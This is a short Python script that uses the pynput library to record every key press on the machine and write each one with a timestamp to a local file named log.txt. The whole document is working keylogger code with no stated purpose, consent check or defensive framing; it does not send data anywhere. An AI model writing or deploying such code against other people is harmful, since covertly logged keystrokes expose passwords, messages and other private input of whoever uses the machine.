from pynput.keyboard import Key, Listener
import logging
log_destination = ""
log_name = "log.txt"
logging.basicConfig(
    filename=(log_destination + log_name),
    level=logging.DEBUG, format='%(asctime)s >> %(message)s'
)

def on_press(key):
    x = logging.info(key)
with Listener(on_press=on_press) as listener:
    listener.join()